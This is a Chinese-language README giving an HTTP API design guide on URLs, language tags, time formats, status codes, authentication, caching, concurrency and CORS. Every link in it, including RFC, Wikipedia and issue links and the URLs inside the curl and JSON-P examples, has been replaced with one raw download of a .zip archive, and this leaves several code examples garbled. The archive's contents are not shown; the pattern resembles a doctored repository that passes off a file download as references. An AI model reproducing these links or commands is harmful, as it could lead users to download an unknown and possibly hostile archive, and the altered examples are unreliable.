# HTTP 接口设计指北

文档主要目的是为大家在设计接口时提供建议，给大家参考 HTTP 或者其他协议/指南已经设计过的内容

**只是建议，不是必须遵从的要求**

大家有什么问题想法或者建议欢迎 [创建 Issue](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 或者 [提交 Pull Request](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

* [README.md](.) 主要是简单介绍和列出对设计可能会有帮助的资料，少放一些私货
* [SUPPLEMENT.md](./SUPPLEMENT.md) 有一些更细节的接口设计方面的我自己的想法，全是私货

## 目录

* [HTTP 协议](#user-content-http-协议)
* [URL](#user-content-url)
* [空字段](#user-content-空字段)
* [国际化](#user-content-国际化)
* [请求方法](#user-content-请求方法)
* [状态码](#user-content-状态码)
* [身份验证](#user-content-身份验证)
* [超文本驱动和资源发现](#user-content-超文本驱动和资源发现)
* [数据缓存](#user-content-数据缓存)
* [并发控制](#user-content-并发控制)
* [跨域](#user-content-跨域)
* [其他资料](#user-content-其他资料)
* [其他接口设计指南](#user-content-其他接口设计指南)

## HTTP 协议

### HTTP/1.1

2014 年 6 月的时候 IETF 已经正式的废弃了 [RFC 2616](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ，将它拆分为六个单独的协议说明，并重点对原来语义模糊的部分进行了解释：

* RFC 7230 - HTTP/1.1: [Message Syntax and Routing](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) - low-level message parsing and connection management
* RFC 7231 - HTTP/1.1: [Semantics and Content](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) - methods, status codes and headers
* RFC 7232 - HTTP/1.1: [Conditional Requests](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) - e.g., If-Modified-Since
* RFC 7233 - HTTP/1.1: [Range Requests](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) - getting partial content
* RFC 7234 - HTTP/1.1: [Caching](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) - browser and intermediary caches
* RFC 7235 - HTTP/1.1: [Authentication](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) - a framework for HTTP authentication

相关资料：

* [RFC2616 is Dead](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) （[中文版](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)）

### HTTP/2

HTTP 协议的 2.0 版本还没有正式发布，但目前已经基本稳定下来了。

[2.0 版本的设计目标是尽量在使用层面上保持与 1.1 版本的兼容，所以，虽然数据交换的格式发生了变化，但语义基本全部被保留下来了](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)。

因此，作为使用者而言，我们并不需要为了支持 2.0 而大幅修改代码。

* [HTTP/2 latest draft](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [HTTP/2 草案的中文版](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip(06-29).md)
* [HTTP/1.1 和 HTTP/2 数据格式的对比](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

## URL

URL 的设计都需要遵守 [RFC 3986](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 的的规范。

URL 的长度，在 HTTP/1.1: Message Syntax and Routing([RFC 7230](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)) 的 [3.1.1](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 小节中有说明，本身不限制长度。但是在实践中，服务器和客户端本身会施加限制*，因此需要根据自己的场景和需求做对应的调整

* 比如 IE8 的 URL 最大长度是 2083 个字符；nginx 的 [`large_client_header_buffers`](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 默认值是 8k ，整个 [request-line](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 超过 8k 时就会返回 414 (Request-URI Too Large)
* [Microsoft REST API Guidelines - 7.2. URL length](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

**强烈建议 API 部署 SSL 证书**，这样接口传递的数据的安全性才能获得一定的保障。

## 空字段

接口遵循“输入宽容，输出严格”原则，输出的数据结构中空字段的值一律为 `null`

## 国际化

### 语言标签

[RFC 5646](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ([BCP 47](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)) 规定的语言标签的格式如下：

```
language-script-region-variant-extension-privateuse
```

1. `language`：这部分使用的是 ISO 639-1, ISO 639-2, ISO 639-3, ISO 639-5 中定义的语言代码，必填
    * 这个部分由 `primary-extlang` 两个部分构成
    * `primary` 部分使用 ISO 639-1, ISO 639-2, ISO 639-3, ISO 639-5 中定义的语言代码，优先使用 ISO 639-1 中定义的条目，比如汉语 `zh`
    * `extlang` 部分是在某些历史性的兼容性的原因，在需要非常细致地区别 `primary` 语言的时候使用，使用 ISO 639-3 中定义的三个字母的代码，比如普通话 `cmn`
    * 虽然 `language` 可以只写 `extlang` 省略 `primary` 部分，但出于兼容性的考虑，还是**建议**加上 `primary` 部分
2. `script`: 这部分使用的是 [ISO 15924](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ([Wikipedia](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)) 中定义的语言代码，比如简体汉字是 `zh-Hans` ，繁体汉字是 `zh-Hant` 。
3. `region`: 这部分使用的是 [ISO 3166-1][iso3166-1] ([Wikipedia][iso3166-1_wiki]) 中定义的地理区域代码，比如 `zh-Hans-CN` 就是中国大陆使用的简体中文。
4. `variant`: 用来表示 `extlang` 的定义里没有包含的方言，具体的使用方法可以参考 [RFC 5646](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 。
5. `extension`: 用来为自己的应用做一些语言上的额外的扩展，具体的使用方法可以参考 [RFC 5646](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 。
6. `privateuse`: 用来表示私有协议中约定的一些语言上的区别，具体的使用方法可以参考 [RFC 5646](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 。

其中只有 `language` 部分是必须的，其他部分都是可选的；不过为了便于编写程序，建议设计接口时约定语言标签的结构，比如统一使用 `language-script-region` 的形式（ `zh-Hans-CN`, `zh-Hant-HK` 等等）。

语言标签是大小写不敏感的，但按照惯例，建议 `script` 部分首字母大写， `region` 部分全部大写，其余部分全部小写。

**有一点需要注意，任何合法的标签都必须经过 IANA 的认证，已通过认证的标签可以在[这个网页](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)查到。此外，网上还有一个非官方的[标签搜索引擎](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)。**

相关资料：

* ISO 639-1 Code List ([Wikipedia](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip))
* [ISO 639-2 Code List](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ([Wikipedia](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip))
* [ISO 639-3 Code List](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [ISO 639-5 Code List](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ([Wikipedia](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip))
* [ISO 639-3 Macrolanguage Mappings](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ([Wikipedia](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip))
* [Relationship between ISO 639-3 and the other parts of ISO 639](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [网页头部的声明应该是用 lang="zh" 还是 lang="zh-cn"？ - 知乎](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [IETF language tag - Wikipedia](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [语种名称代码](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ：文中对带有方言（ `extlang` ）部分的标签介绍有误
* [Language tags in HTML and XML](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [Choosing a Language Tag](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

### 时区

客户端请求服务器时，如果对时间有特殊要求（如某段时间每天的统计信息），则可以参考 [IETF 相关草案](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 增加请求头 `Timezone` 。

```
Timezone: 2016-11-06 23:55:52+08:00;;Asia/Shanghai
```

具体格式说明：

```
Timezone: RFC3339 约定的时间格式;POSIX 1003.1 约定的时区字符串;tz datebase 里的时区名称
```

客户端最好提供所有字段，如果没有办法提供，则应该使用空字符串

如果客户端请求时没有指定相应的时区，则服务端默认使用最后一次已知时区或者 [UTC](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 时间返回相应数据。

PS 考虑到存在[夏时制](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)这种东西，所以不推荐客户端在请求时使用 Offset 。

相关资料：

* [RFC3339](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [tz datebase](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ([Wikipedia](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip))
* POSIX 1003.1 时区字符串的说明文档
    * [GNU 的文档](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
    * [IBM 的文章](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

### 时间格式

时间格式遵循 [ISO 8601](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)([Wikipedia](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)) 建议的格式：

* 日期 `2014-07-09`
* 时间 `14:31:22+0800`
* 具体时间 `2007-11-06T16:34:41Z`
* 持续时间 `P1Y3M5DT6H7M30S` （表示在一年三个月五天六小时七分三十秒内）
* 时间区间 `2007-03-01T13:00:00Z/2008-05-11T15:30:00Z` 、 `2007-03-01T13:00:00Z/P1Y2M10DT2H30M` 、 `P1Y2M10DT2H30M/2008-05-11T15:30:00Z`
* 重复时间 `R3/2004-05-06T13:00:00+08/P0Y6M5DT3H0M0S` （表示从2004年5月6日北京时间下午1点起，在半年零5天3小时内，重复3次）

相关资料：

* [What's the difference between ISO 8601 and RFC 3339 Date Formats?](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [JSON风格指南 - Google 风格指南（中文版）](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

### 货币名称

货币名称可以参考 [ISO 4217](javascript:;)([Wikipedia](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)) 中的约定，标准为货币名称规定了三个字母的货币代码，其中的前两个字母是 [ISO 3166-1][iso3166-1]([Wikipedia][iso3166-1_wiki]) 中定义的双字母国家代码，第三个字母通常是货币的首字母。在货币上使用这些代码消除了货币名称（比如 dollar ）或符号（比如 $ ）的歧义。

相关资料：

* 《RESTful Web Services Cookbook 中文版》 3.9 节《如何在表述中使用可移植的数据格式》

## 请求方法

* 如果请求头中存在 `X-HTTP-Method-Override` 或参数中存在 `_method`（拥有更高权重），且值为 `GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `OPTIONS`, `HEAD` 之一，则视作相应的请求方式进行处理
* `GET`, `DELETE`, `HEAD` 方法，参数风格为标准的 `GET` 风格的参数，如 `url?a=1&b=2`
* `POST`, `PUT`, `PATCH`, `OPTIONS` 方法
    * 默认情况下请求实体会被视作标准 json 字符串进行处理，当然，依旧推荐设置头信息的 `Content-Type` 为 `application/json`
    * 在一些特殊接口中（会在文档中说明），可能允许 `Content-Type` 为 `application/x-www-form-urlencoded` 或者 `multipart/form-data` ，此时请求实体会被视作标准 `POST` 风格的参数进行处理

关于方法语义的说明：

* `OPTIONS` 用于获取资源支持的所有 HTTP 方法
* `HEAD` 用于只获取请求某个资源返回的头信息
* `GET` 用于从服务器获取某个资源的信息
    * 完成请求后返回状态码 `200 OK`
    * 完成请求后需要返回被请求的资源详细信息
* `POST` 用于创建新资源
    * 创建完成后返回状态码 `201 Created`
    * 完成请求后需要返回被创建的资源详细信息
* `PUT` 用于完整的替换资源或者创建指定身份的资源，比如创建 id 为 123 的某个资源
    * 如果是创建了资源，则返回 `201 Created`
    * 如果是替换了资源，则返回 `200 OK`
    * 完成请求后需要返回被修改的资源详细信息
* `PATCH` 用于局部更新资源
    * 完成请求后返回状态码 `200 OK`
    * 完成请求后需要返回被修改的资源详细信息
* `DELETE` 用于删除某个资源
    * 完成请求后返回状态码 `204 No Content`

相关资料：

* [RFC 7231 中对请求方法的定义](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [RFC 5789](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) - PATCH 方法的定义
* [维基百科](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

## 状态码

### 请求成功

* 200 **OK** : 请求执行成功并返回相应数据，如 `GET` 成功
* 201 **Created** : 对象创建成功并返回相应资源数据，如 `POST` 成功；创建完成后响应头中应该携带头标 `Location` ，指向新建资源的地址
* 202 **Accepted** : 接受请求，但无法立即完成创建行为，比如其中涉及到一个需要花费若干小时才能完成的任务。返回的实体中应该包含当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便客户端能够获取最新状态。
* 204 **No Content** : 请求执行成功，不返回相应资源数据，如 `PATCH` ， `DELETE` 成功

### 重定向

**重定向的新地址都需要在响应头 `Location` 中返回**

* 301 **Moved Permanently** : 被请求的资源已永久移动到新位置
* 302 **Found** : 请求的资源现在临时从不同的 URI 响应请求
* 303 **See Other** : 对应当前请求的响应可以在另一个 URI 上被找到，客户端应该使用 `GET` 方法进行请求。比如在创建已经被创建的资源时，可以返回 `303`
* 307 **Temporary Redirect** : 对应当前请求的响应可以在另一个 URI 上被找到，客户端应该保持原有的请求方法进行请求

### 条件请求

* 304 **Not Modified** : 资源自从上次请求后没有再次发生变化，主要使用场景在于实现[数据缓存](#user-content-数据缓存)
* 409 **Conflict** : 请求操作和资源的当前状态存在冲突。主要使用场景在于实现[并发控制](#user-content-并发控制)
* 412 **Precondition Failed** : 服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。主要使用场景在于实现[并发控制](#user-content-并发控制)

### 客户端错误

* 400 **Bad Request** : 请求体包含语法错误
* 401 **Unauthorized** : 需要验证用户身份，如果服务器就算是身份验证后也不允许客户访问资源，应该响应 `403 Forbidden` 。如果请求里有 `Authorization` 头，那么必须返回一个 [`WWW-Authenticate`](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 头
* 403 **Forbidden** : 服务器拒绝执行
* 404 **Not Found** : 找不到目标资源
* 405 **Method Not Allowed** : 不允许执行目标方法，响应中应该带有 `Allow` 头，内容为对该资源有效的 HTTP 方法
* 406 **Not Acceptable** : 服务器不支持客户端请求的内容格式，但响应里会包含服务端能够给出的格式的数据，并在 `Content-Type` 中声明格式名称
* 410 **Gone** : 被请求的资源已被删除，只有在确定了这种情况是永久性的时候才可以使用，否则建议使用 `404 Not Found`
* 413 **Payload Too Large** : `POST` 或者 `PUT` 请求的消息实体过大
* 415 **Unsupported Media Type** : 服务器不支持请求中提交的数据的格式
* 422 **Unprocessable Entity** : 请求格式正确，但是由于含有语义错误，无法响应
* 428 **Precondition Required** : 要求先决条件，如果想要请求能成功必须满足一些预设的条件

### 服务端错误

* 500 **Internal Server Error** : 服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。
* 501 **Not Implemented** : 服务器不支持当前请求所需要的某个功能。
* 502 **Bad Gateway** : 作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。
* 503 **Service Unavailable** : 由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 `Retry-After` 头用以标明这个延迟时间（内容可以为数字，单位为秒；或者是一个 [HTTP 协议指定的时间格式](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)）。如果没有给出这个 `Retry-After` 信息，那么客户端应当以处理 500 响应的方式处理它。

`501` 与 `405` 的区别是：`405` 是表示服务端不允许客户端这么做，`501` 是表示客户端或许可以这么做，但服务端还没有实现这个功能

相关资料：

* [RFC 里的状态码列表](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [RFC 4918](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) - 422 状态码的定义
* [RFC 6585](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) - 新增的四个 HTTP 状态码，[中文版](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [维基百科上的《 HTTP 状态码》词条](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [Do I need to use http redirect code 302 or 307? - Stack Overflow](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [400 vs 422 response to POST of data](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [HTTP Status Codes Decision Diagram – Infographic](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [HTTP Status Codes](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

## 身份验证

部分接口需要通过某种身份验证方式才能请求成功（这些接口**应该**在文档中标注出来），合适的身份验证解决方案目前有两种：

* [HTTP 基本认证](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)，**最好只在部署了 SSL 证书的情况下才可以使用，否则用户密码会有暴露的风险**
* [OAuth 2.0](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
    * [官网](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
    * [理解OAuth 2.0 - 阮一峰](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 以及对[文中 `state` 参数的介绍的修正](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
    * [JSON Web Token](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ，一种 Token 的生成标准
        * [Json Web Tokens: Introduction](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
        * [Json Web Tokens: Examples](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

## 超文本驱动和资源发现

REST 服务的要求之一就是[超文本驱动](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)，客户端不再需要将某些接口的 URI 硬编码在代码中，唯一需要存储的只是 API 的 HOST 地址，能够非常有效的降低客户端与服务端之间的耦合，服务端对 URI 的任何改动都不会影响到客户端的稳定。

目前有几种方案试图实现这个效果：

* [JSON HAL](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ，示例可以参考 [JSON HAL 作者自己的介绍](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [GitHub API 使用的方案](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ，应该是一种 JSON HAL 的变体
* [JSON API](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ，（这里有 [@迷渡](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 发起的 [中文版](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ），另外一种类似 JSON HAL 的方案
* [Micro API](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ，一种试图与 [JSON-LD](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 兼容的方案

目前所知的方案都实现了发现资源的功能，服务端同时需要实现 `OPTIONS` 方法，并在响应中携带 `Allow` 头来告知客户端当前拥有的操作权限。

## 数据缓存

大部分接口应该在响应头中携带 `Last-Modified`, `ETag`, `Vary`, `Date` 信息，客户端可以在随后请求这些资源的时候，在请求头中使用 `If-Modified-Since`, `If-None-Match` 等请求头来确认资源是否经过修改。

如果资源没有进行过修改，那么就可以响应 `304 Not Modified` 并且不在响应实体中返回任何内容。

```bash
$ curl -i https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip{RESOURCE_URI}
HTTP/1.1 200 OK
Cache-Control: public, max-age=60
Date: Thu, 05 Jul 2012 15:31:30 GMT
Vary: Accept, Authorization
ETag: "644b5b0155e6404a9cc4bd9d8b1ae730"
Last-Modified: Thu, 05 Jul 2012 15:31:30 GMT

Content
```

```bash
$ curl -i https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip{RESOURCE_URI} -H "If-Modified-Since: Thu, 05 Jul 2012 15:31:30 GMT"
HTTP/1.1 304 Not Modified
Cache-Control: public, max-age=60
Date: Thu, 05 Jul 2012 15:31:45 GMT
Vary: Accept, Authorization
Last-Modified: Thu, 05 Jul 2012 15:31:30 GMT
```

```bash
$ curl -i https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip{RESOURCE_URI} -H 'If-None-Match: "644b5b0155e6404a9cc4bd9d8b1ae730"'
HTTP/1.1 304 Not Modified
Cache-Control: public, max-age=60
Date: Thu, 05 Jul 2012 15:31:55 GMT
Vary: Accept, Authorization
ETag: "644b5b0155e6404a9cc4bd9d8b1ae730"
Last-Modified: Thu, 05 Jul 2012 15:31:30 GMT
```

相关资料：

* [RFC 7232](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [HTTP 缓存 - Google Developers](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [RFC 2616 中缓存过期时间的算法](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip), [MDN 版](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip), [中文版](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [HTTP 协议中 Vary 的一些研究](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [Cache Control 與 ETag](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

## 并发控制

不严谨的实现，或者缺少并发控制的 `PUT` 和 `PATCH` 请求可能导致 “更新丢失”。这个时候可以使用 `Last-Modified` 和/或 `ETag` 头来实现条件请求，支持乐观并发控制。

下文只考虑使用 `PUT` 和 `PATCH` 方法更新资源的情况。

* 客户端发起的请求如果没有包含 `If-Unmodified-Since` 或者 `If-Match` 头，那就返回状态码 `403 Forbidden` ，在响应正文中解释为何返回该状态码
* 客户端发起的请求提供的 `If-Unmodified-Since` 或者 `If-Match` 头与服务器记录的实际修改时间或 `ETag` 值不匹配的时候，返回状态码 `412 Precondition Failed`
* 客户端发起的请求提供的 `If-Unmodified-Since` 或者 `If-Match` 头与服务器记录的实际修改时间或 `ETag` 的历史值匹配，但资源已经被修改过的时候，返回状态码 `409 Conflict`
* 客户端发起的请求提供的条件符合实际值，那就更新资源，响应 `200 OK` 或者 `204 No Content` ，并且包含更新过的 `Last-Modified` 和/或 `ETag` 头，同时包含 `Content-Location` 头，其值为更新后的资源 URI

相关资料：

* 《RESTful Web Services Cookbook 中文版》 10.4 节 《如何在服务器端实现条件 PUT 请求》
* [RFC 7232 "Conditional Requests"](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [Location vs. Content-Location](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

## 跨域

### CORS

接口支持[“跨域资源共享”（Cross Origin Resource Sharing, CORS）](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)，[这里](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)和[这里](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)和[这份中文资料](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)有一些指导性的资料。

简单示例：

```bash
$ curl -i https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip -H "Origin: https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip"
HTTP/1.1 302 Found
```

```bash
$ curl -i https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip -H "Origin: https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip"
HTTP/1.1 302 Found
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: ETag, Link, X-Total-Count
Access-Control-Allow-Credentials: true
```

预检请求的响应示例：

```bash
$ curl -i https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip -H "Origin: https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip" -X OPTIONS
HTTP/1.1 302 Found
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With
Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE
Access-Control-Expose-Headers: ETag, Link, X-Total-Count
Access-Control-Max-Age: 86400
Access-Control-Allow-Credentials: true
```

### JSON-P

如果在任何 `GET` 请求中带有参数 `callback` ，且值为非空字符串，那么接口将返回如下格式的数据

```bash
$ curl https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip{RESOURCE_URI}?callback=foo
```

```javascript
foo({
  "meta": {
    "status": 200,
    "X-Total-Count": 542,
    "Link": [
      {"href": "https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip{RESOURCE_URI}?cursor=0&count=100", "rel": "first"},
      {"href": "https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip{RESOURCE_URI}?cursor=90&count=100", "rel": "prev"},
      {"href": "https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip{RESOURCE_URI}?cursor=120&count=100", "rel": "next"},
      {"href": "https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip{RESOURCE_URI}?cursor=200&count=100", "rel": "last"}
    ]
  },
  "data": // data
})
```

## 其他资料

* [Httpbis Status Pages](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [所有在 IANA 注册的消息头和相关标准的列表](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
